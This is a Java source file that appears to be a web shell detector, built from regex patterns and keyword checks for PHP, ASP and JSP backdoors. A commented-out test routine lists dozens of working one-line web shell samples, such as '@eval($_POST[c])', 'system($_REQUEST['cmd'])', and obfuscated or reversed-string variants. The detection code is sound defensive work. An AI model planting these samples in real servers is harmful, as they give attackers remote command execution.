package alibaba.safe.webshell.find;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.Arrays;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Set;
import java.util.regex.Pattern;



public class WebShellFilter_0924 {
	
	static Set<String> cmdKeys = new HashSet<>();
	static {
		cmdKeys.add("eval");
		cmdKeys.add("assert");
		cmdKeys.add("exec");
		cmdKeys.add("execute");
		cmdKeys.add("passthru");
		cmdKeys.add("reflection");
		cmdKeys.add("include");
		cmdKeys.add("arrays");
		cmdKeys.add("shell");
		cmdKeys.add("open");
	}
	
	static String cmd = "("
			+ "eval"
			+ "|assert"
			+ "|exec"
			+ "|execute"
			+ "|curl_exec"
			+ "|system"
			+ "|shell_exec"
			+ "|pcntl_exec"
			+ "|popen"
			+ "|proc_open"
			+ "|passthru"
			+ "|call_user_func"
			+ "|ReflectionMethod"
			+ "|ReflectionFunction"
			+ "|ExecuteGlobal"
			+ "|escapeshellcmd"
			+ "|include"
			+ "|require"
			+ "|include_once"
			+ "|require_once"
			+ "|array_map"
			+ "|array_walk"
			+ ")+";
	
	
	
	/** 正则表达式 */
	static List<String> regexs = Arrays.asList(
			
			"function_exists\\s*\\(\\s*[\'|\"]"+cmd+"+[\'|\"]\\s*\\)",
			cmd+"\\s*\\(\\s*\\$_(\\w+)\\[(.*)\\]\\s*\\)",
		    "((udp|tcp)://(.*);)+",
		    "preg_replace\\s*\\((.*)/e(.*),\\s*\\$_(.*),(.*)\\)",
		    "preg_replace\\s*\\((.*),base64_decode\\(\\$",
		    cmd+"(\\s|)*\\((\\s|)*(urldecode|json_decode|base64_decode|str_rot13|gz(\\w+)|file_(\\w+)_contents|(.*)php://input)+",
		    cmd+"\\s*\\(\\s*\\$_(GET|POST|REQUEST|COOKIE|SERVER|FILES|SERVER)+\\[(.*)\\]\\s*\\)",
		    "eval\\s*\\(\\s*\\(\\s*\\$\\$(\\w+)",
		    "(include|require|include_once|require_once)+\\s*\\(\\s*[\'|\"](\\w+)\\.(jpg|gif|ico|bmp|png|txt|zip|rar|htm|css|js)+[\'|\"]\\s*\\)",
		    "\\$_(\\w+)(.*)(eval|assert|include|require|include_once|require_once)+\\s*\\(\\s*\\$(\\w+)\\s*\\)",
		    "\\(\\s*\\$_FILES\\[(.*)\\]\\[(.*)\\]\\s*,\\s*\\$_(GET|POST|REQUEST|COOKIE|SERVER|FILES|SERVER)+\\[(.*)\\]\\[(.*)\\]\\s*\\)",
		    "(fopen|fwrite|fputs|file_put_contents)+\\s*\\((.*)\\$_(GET|POST|REQUEST|COOKIE|SERVER|FILES|SERVER)+\\[(.*)\\](.*)\\)",
		    "echo\\s*"+cmd+"\\s*\\(\\s*\\$(\\w+)\\s*\\)",
		    "new com\\s*\\(\\s*[\'|\"]shell(.*)[\'|\"]\\s*\\)",
		    "\\$(.*)\\s*\\((.*)/e(.*)\\,\\s*\\$_(.*),(.*)\\)",
		    "\\$_=(.*)\\$_",
		    "\\$_(ET|POST|REQUEST|COOKIE|SERVER|FILES|SERVER)+\\[(.*)\\]\\(\\s*\\$(.*)\\)",
		    "\\$(\\w+)\\s*\\(\\s*\\$_(GET|POST|REQUEST|COOKIE|SERVER)+\\[(.*)\\]\\s*\\)",
		    "\\$(\\w+)\\s*\\(\\s*\\$\\{(.*)\\}",
		    "(\\$(\\w+)|eval)\\s*\\(\\s*chr\\(\\d+\\)",
		    
		    // eval(get_magic_quotes_gpc()?stripslashes($_POST[chr(122).chr(48)]):$_POST[chr(122).chr(48)])
		    cmd+"\\s*\\(\\s*get_magic_quotes_gpc()\\s*?(.)*:(.)*\\)",
		    // eval (System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String( 

		    // @eval(${'_POST'}[z9](${'_POST'}[z0]));
		    cmd+"(\\s|)*\\((\\s|)*\\$\\{(\\s|)*[\"|\']_(GET|POST|REQUEST|COOKIE|SERVER)[\"|\']\\}",
		    // 防止生成错误报告
		    "ini_set\\s*\\(\\s*[\'|\"]display_errors[\'|\"]\\s*,\\s*[\'|\"]0[\'|\"]\\)",
		    
		 
		    // Jscript
		    cmd+"\\s*\\(\\s*Request\\.Item\\[\"(.*)\"\\],",
		    // execute(request("xiaoma"))
//		    cmd+"\\s*\\(\\s*request\\([\'|\"]",
//		    cmd+"\\s*\\(\\s*request\\(chr\\(\\d+",
		    cmd+"\\s*\\(\\s*request",
		    // eval request("a")
		    //cmd+"(\\s)request\\([\'|\"](.*)[\'|\"]\\)",
		    cmd+"(\\s)request\\(",
		    		   
		    // Eval(Request(chr(112)))
		    //cmd+"(\\s)request\\(chr\\(\\d+",
		    // <%execute(strreverse(")""xx""(tseuqer lave"))%>
		    cmd+"\\s*\\(\\s*strreverse\\(",
		    cmd+"(\\s)strreverse\\(",
		    
		    "([^\\w+]|^)Server\\.MapPath\\s*\\(\\s*Request",
		    		    
		    //eval($fatezero);
		    cmd+"\\s*\\(\\s*\\$\\w+\\s*\\)",
		    
//		    mywrite.write(request.form("content")) 
//		    nonamed.Write(Request.Item["l"]);
		  
		    
		    "\\$[\\w|\"|\'|\\[|\\]|\\.|\\.{|\\}]+\\s*\\(\\s*\\$_(GET|POST|REQUEST|COOKIE|SERVER|FILES|SERVER)"
		    
			);
			
	static List<Pattern> patterns = new LinkedList<>();
	
	static {
		for(String regex : regexs){
			patterns.add(Pattern.compile(regex, Pattern.CASE_INSENSITIVE));
		}
	}
		
	static boolean check(String input){
		
		// 去注释
		input = removeZhushi2(input);
		
		// 字符串拼接
		input = input.replaceAll("\"\\s*\\.\\s*\"", "")
		.replaceAll("'\\s*\\.\\s*'", "")
		.replaceAll("\"\\s*\\+\\s*\"", "")
		.replaceAll("'\\s*\\+\\s*'", "")
		.replaceAll("'\\s*&\\s*'", "")
		.replaceAll("\"\\s*&\\s*\"", "");
			
		// Execute("Execute("":Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):
		String lowerCase = input.toLowerCase();
		if (lowerCase.contains("request.getparameter")){
			if(lowerCase.contains("outputstream")||lowerCase.contains("writer"))
				return true;
		}
		
		if (lowerCase.contains("tseuqer lave")){
			if(lowerCase.contains("execute")||lowerCase.contains("reverse"))
				return true;
		}

		if(lowerCase.contains("wget http://"))
			return true;
		
		if (lowerCase.contains("base64_decode")
				|| lowerCase.contains("str_rot13")
				|| lowerCase.contains("urldecode")
				|| lowerCase.contains("gzinflate")
				|| lowerCase.contains("gzdecode")
				|| lowerCase.contains("system.convert.frombase64string")
				|| lowerCase.contains("runtime.getruntime().exec(")
				|| lowerCase.contains("system.reflection.assembly.load"))
			return true;
		
		if(_check(input))
			return true;
		
		// 变量替换
		return false;
		
	}
	
	

	static boolean _check(String input){
		
		boolean doCheck = false;
		for(String key : cmdKeys){
			if(input.contains(key)){
				doCheck = true;
				break;
			}
		}
		
		if (doCheck||input.contains("(") || input.contains("$") || input.contains(".")||input.contains("eval")
				||input.contains("udp")||input.contains("tcp")||input.contains("`")) {
		
			for (Pattern pattern : patterns) {		
				if (pattern.matcher(input).find()) {
					return true;
				}
			}
		}
		
		return false;
	}
	
	
	// 去掉  /* */
	 private static String removeZhushi2(String str) {

			while (true) {
				
				int start = str.indexOf("/*");
				if (start == -1)
					return str;
				
				int end = str.indexOf("*/", start + 2);
				if (end == -1)
					return str;
				
				end += 2;
				StringBuilder builder = new StringBuilder();
				for (int i = 0; i < str.length(); ++i) {
					if (i >= start && i < end)
						continue;
					builder.append(str.charAt(i));
				}
				str = builder.toString();
			}
		}
	
	
//	 public static void main(String[] args) throws IOException {
//	
//			BufferedReader reader = new BufferedReader(new FileReader(new File(FileUtil.getBaseFilePath()+"/in.txt")));
//			String line = null;
//			int num = 0;
//			while((line=reader.readLine())!=null){
//				if(!check(line)){
//					System.out.println(line);
//					num++;
//				}
//			}
//			System.out.println(num);
//		 
//	 }

	
//	public static void main(String[] args) {
//		
//		//   <%e+x-v+x-a+x-l(+x-r+x-e+x-q+x-u+x-e+x-s+x-t+x-(+x-+ACI-c+ACI)+x-)+x-%> 
//		// 		"var lcx = {'名字' : Request.form('#'), '性别' : eval, '年龄' : '18', '昵称' : 'o040'};lcx.性别((lcx.名字)+'');"
//
//		
//		List<String> lsStrs = Arrays.asList(
//				"system (\"exploit $hex\");"
//				, "eval('123')"
//				, "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(\"\",$_cC);@$_();?>"
//				, "eval(base64_decode('AZHJKZ'));"
//				, "<?php $s=@$_GET[2];if(md5($s.$s)==\"e67c2597ecad64bb4cdad6633b04107f\")@eval($_REQUEST[$s]); ?>"
//				, "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>"
//				, "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>"
//				, "eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFeDVPRGhRTTBKdlkwRndiR1J0Um5OTFExSm1WVVU1VkZaR2RHdGlNamw1V0ZOclMweDVPQzVqYUhJb05EY3BMbEJuS1NrNykpOw));"
//				, "<?php call_user_func(create_function(null,'assert($_POST[c]);'));?>"
//				, "<?php $x=base64_decode(\"YXNzZXJ0\");$x($_POST['c']);?>"
//				,"<?php @eval($_POST[c])?>"
//				,"<?php system($_REQUEST['cmd']);?> "
//				,"<?fputs(fopen(c.php,w),<?eval($_POST[c]);?>)?>"
//				,"<?$_POST['sa']($_POST['sb']);?>"
//				,"<?$_POST['sa']($_POST['sb'],$_POST['sc'])?>"
//				,"<?php @preg_replace(\"/[email]/e\",$_POST['h'],\"error\"); ?>"
//				,"$filename=$_GET['xbid']; include_once ($filename);"
//				,"<?php $c='ass'.'ert';${c}($_POST[4]);?>"
//				,"<?php $k = str_replace(\"8\",\"\",\"a8s88s8e8r88t\");$k($_POST[\"8\"]); ?>"	 
//				,"<%eval request(\"sb\")%>"
//				,"<%eval request(\"sb\")%>"
//				,"<%execute request(\"sb\")%>"
//				,"<%execute(request(\"sb\"))%>"
//				,"<%execute request(\"sb\")%><%'<% loop <%:%>"
//				,"Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")"
//				,"<%execute(strreverse(\")\"\"xx\"\"(tseuqer lave\"))%>"
//				,"<% xx=request(\"xx\")  eval xx %> "
//				,"<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"pass\"],\"unsafe\");%> "
//				,"<%@ Page Language=\"Jscript\" validateRequest=\"false\" %><%Response.Write(eval(Request.Item[\"w\"],\"unsafe\"));%>"
//				,"<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request[\"f\"])  ); }%>"
//				,"<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request(\"f\")) ) %>"
//				,"function_exists ('popen')",
//			
//				"eval(Request.Item[\"pass\"],\"unsafe\")",
//				"Response.Write(eval(Request.Item[\"w\"],\"unsafe\"))",
//				"mywrite.write(request.form(\"content\")) ",
//				"nonamed.Write(Request.Item[\"l\"]);",
//				"popup(popup(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"UmVxdWVzdC5JdGVtWyJ6Il0=\"))));",
//				"strreverse(\")\"\"xx\"\"(tseuqer lave\")",
//				"xxx=replace(xxx,\"0\",\"\") ",
//				" Function d(s):d=Mid(love,s,1):End Function:love=\"(tqxuesrav l)\"&\"\"\"\":execute(d(6)&d(10)&d(9)&d(12)&d(11)&d(8)&d(6)&d(3)&d(5)&d(6)&d(7)&d(2)&d(1)&d(14)&d(4)&d(4)&d(14)&d(13)) ",
//				"eval(\"e\"&\"v\"&\"a\"&\"l\"&\"(\"&\"r\"&\"e\"&\"q\"&\"u\"&\"e\"&\"s\"&\"t\"&\"(\"&\"0″&\"-\"&\"2″&\"-\"&\"5″&\")\"&\")\")",
//				"MorfiCoder=Replace(Replace(StrReverse(Code),\"/*/\",\"\"\"\"),\"\\*\",vbCrlf)",
//				"execute request(\"sb\")",
//				"ExecuteGlobal request(\"sb\")",
//				"Server.CreateObject(\"ScriptControl\")",
//				 "Execute(DeAsc(\"%119%136%115%126%50%132%119%131%135%119%133%134%58%52%116%115%133%119%52%59\"))",
//				 "Execute cd(\"6877656D2B736972786677752B237E232C2A\",\"1314\")",
//				 "ExecuteGlobal(StrReverse(a)) ",
//				 "rquest.getParameter(\"f\")",
//				 "eval xx2",
//				 "shell_exec(base64_decode('AXADED'))",
//				 "exec(\"123\")",
//				 "eval(base64_decode('asas'))"
//				 
//						);
//		
//		for(String str : lsStrs){
//				
//			if(!check(str))
//			System.out.println(str);
//		}
////		
//		
//	
////
////		
//	}
	
}
